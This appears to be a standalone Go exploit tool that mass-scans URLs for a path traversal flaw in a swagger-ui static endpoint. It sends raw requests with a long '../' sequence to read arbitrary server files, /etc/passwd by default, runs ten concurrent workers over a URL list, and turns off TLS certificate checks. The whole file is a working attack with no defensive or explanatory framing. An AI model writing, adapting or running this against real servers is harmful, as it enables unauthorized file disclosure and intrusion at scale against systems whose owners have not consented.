package main

import (
        "bufio"
        "crypto/tls"
        "flag"
        "fmt"
        "net"
        "net/url"
        "os"
        "strconv"
        "strings"
        "sync"
)

// this sends an HTTP GET request to the specified host and port, then returns the response body.
func fetchHTTPResponse(host string, port int, resourcePath string) (string, error) {
        var connection net.Conn
        var err error

        address := fmt.Sprintf("%s:%d", host, port)
        if port == 443 {
                connection, err = tls.Dial("tcp", address, &tls.Config{
                        InsecureSkipVerify: true, // Skip SSL certificate verification
                        ServerName:           host,
                })
        } else {
                connection, err = net.Dial("tcp", address)
        }

        if err != nil {
                return "", err
        }
        defer connection.Close()

        requestLine := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", resourcePath, host)
        _, err = connection.Write([]byte(requestLine))
        if err != nil {
                return "", err
        }

        var responseBuilder strings.Builder
        buffer := make([]byte, 4096)
        for {
                bytesRead, err := connection.Read(buffer)
                if err != nil {
                        break
                }
                responseBuilder.Write(buffer[:bytesRead])
        }

        return responseBuilder.String(), nil
}

// this performs an HTTP request to a given URL and prints the response body.
func evaluateURL(rawURL string, filePath string) {
        parsed, err := url.Parse(rawURL)
        if err != nil {
                fmt.Printf("Failed to parse URL %s: %v\n", rawURL, err)
                return
        }

        host := parsed.Hostname()
        port := parsed.Port()
        if port == "" {
                if parsed.Scheme == "https" {
                        port = "443"
                } else {
                        port = "80"
                }
        }

        resourcePath := fmt.Sprintf("/api/swaggerui/static/../../../../../../../../../../../../../../../../%s", filePath)

        response, err := fetchHTTPResponse(host, toInt(port), resourcePath)
        if err != nil {
                fmt.Printf("Error during request to %s: %v\n", rawURL, err)
                return
        }

        parts := strings.SplitN(response, "\r\n\r\n", 2)
        if len(parts) == 2 {
                bodyContent := parts[1]
                fmt.Println(bodyContent)
        }
}

// processURLs reads URLs from a channel and processes them using the evaluateURL function.
func processURLs(urlChannel <-chan string, filePath string, wg *sync.WaitGroup) {
        defer wg.Done()
        for url := range urlChannel {
                evaluateURL(url, filePath)
        }
}

func main() {
        var targetURL string
        var fileList string
        var checkPath string

        flag.StringVar(&targetURL, "url", "", "Target URL (e.g., http://example.com)")
        flag.StringVar(&fileList, "file", "", "File containing a list of URLs (one per line)")
        flag.StringVar(&checkPath, "path", "/etc/passwd", "File path to check (default: /etc/passwd)")
        flag.Parse()

        if targetURL != "" {
                evaluateURL(targetURL, checkPath)
        } else if fileList != "" {
                file, err := os.Open(fileList)
                if err != nil {
                        fmt.Printf("Error opening file %s: %v\n", fileList, err)
                        return
                }
                defer file.Close()

                urlChannel := make(chan string, 100)
                var wg sync.WaitGroup

                scanner := bufio.NewScanner(file)
                for scanner.Scan() {
                        url := scanner.Text()
                        if strings.TrimSpace(url) != "" {
                                urlChannel <- url
                        }
                }
                close(urlChannel)

                for i := 0; i < 10; i++ {
                        wg.Add(1)
                        go processURLs(urlChannel, checkPath, &wg)
                }

                wg.Wait()
        } else {
                flag.Usage()
        }
}

// this converts a string to an integer, returning 0 if the conversion fails.
func toInt(s string) int {
        value, _ := strconv.Atoi(s)
        return value
}
